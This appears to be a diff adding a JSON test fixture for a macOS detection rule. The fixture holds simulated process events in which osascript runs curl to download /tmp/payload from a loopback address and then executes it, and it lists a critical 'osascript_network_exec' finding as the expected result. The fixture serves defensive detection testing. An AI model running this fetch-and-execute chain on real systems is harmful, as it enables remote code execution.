@@ -1,0 +1,23 @@
+{
+  "events": [
+    {"event_id": "one-osa-fork", "host_id": "fixture-host", "timestamp_ns": 1000000000, "event_type": "fork",
+     "payload": {"child_pid": 6001, "parent_pid": 1}},
+    {"event_id": "one-osa-exec", "host_id": "fixture-host", "timestamp_ns": 1010000000, "event_type": "exec",
+     "payload": {"pid": 6001, "ppid": 1, "path": "/usr/bin/osascript",
+                 "args": ["osascript", "-e", "do shell script \"curl -o /tmp/payload http://127.0.0.1:9/x\""],
+                 "cwd": "/tmp", "uid": 501, "gid": 20}},
+    {"event_id": "one-curl-fork", "host_id": "fixture-host", "timestamp_ns": 1050000000, "event_type": "fork",
+     "payload": {"child_pid": 6002, "parent_pid": 6001}},
+    {"event_id": "one-curl-exec", "host_id": "fixture-host", "timestamp_ns": 1060000000, "event_type": "exec",
+     "payload": {"pid": 6002, "ppid": 6001, "path": "/usr/bin/curl",
+                 "args": ["curl", "-o", "/tmp/payload", "http://127.0.0.1:9/x"], "cwd": "/tmp", "uid": 501, "gid": 20}},
+    {"event_id": "one-tmp-fork", "host_id": "fixture-host", "timestamp_ns": 1100000000, "event_type": "fork",
+     "payload": {"child_pid": 6003, "parent_pid": 6001}},
+    {"event_id": "one-tmp-exec", "host_id": "fixture-host", "timestamp_ns": 1110000000, "event_type": "exec",
+     "payload": {"pid": 6003, "ppid": 6001, "path": "/tmp/payload", "args": ["/tmp/payload"],
+                 "cwd": "/tmp", "uid": 501, "gid": 20}}
+  ],
+  "expected_findings": [
+    {"rule_id": "osascript_network_exec", "severity": "critical", "event_ids": ["one-tmp-exec"]}
+  ]
+}
